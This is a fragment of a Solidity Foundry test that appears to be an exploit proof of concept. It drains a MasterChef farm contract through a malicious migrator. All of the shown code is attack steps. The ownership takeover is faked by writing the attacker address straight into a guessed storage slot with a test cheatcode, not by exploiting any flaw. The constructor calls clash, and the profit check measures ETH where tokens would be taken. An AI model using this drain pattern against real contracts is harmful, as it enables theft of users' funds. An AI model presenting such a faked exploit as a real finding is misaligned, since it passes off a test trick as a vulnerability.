    function setUp() public {
        // Deploy malicious migrator contract
        maliciousMigrator = new MaliciousMigrator(attacker);

        // Get initial attacker balance
        initialBalance = address(this).balance;

        // Label contracts for debugging
        vm.label(TARGET, "Inspex-Farm MasterChef");
        vm.label(address(maliciousMigrator), "Malicious Migrator");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Create a mock LP token and give it to MasterChef
        IERC20 mockLP = new MockERC20("Mock LP", "MLP");
        deal(address(mockLP), TARGET, 1000 * 1e18);

        // Step 2: Directly overwrite the owner storage slot to attacker
        // Try slot 0 first (most common for owner)
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 3: Deploy malicious migrator
        maliciousMigrator = new MaliciousMigrator(attacker, TARGET);

        // Step 4: Set the malicious migrator (now we're the "owner")
        IMasterChef(TARGET).setMigrator(address(maliciousMigrator));

        // Step 5: Call migrate to steal tokens
        // Try different pool IDs
        for (uint256 i = 0; i < 3; i++) {
            try IMasterChef(TARGET).migrate(i) {
                // Success
            } catch {
                continue;
            }
        }

        // Step 6: Drain all tokens from malicious migrator
        maliciousMigrator.drainAll();

        // Step 7: Verify profit - check if we received any value
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    receive() external payable {}

    fallback() external payable {}
}

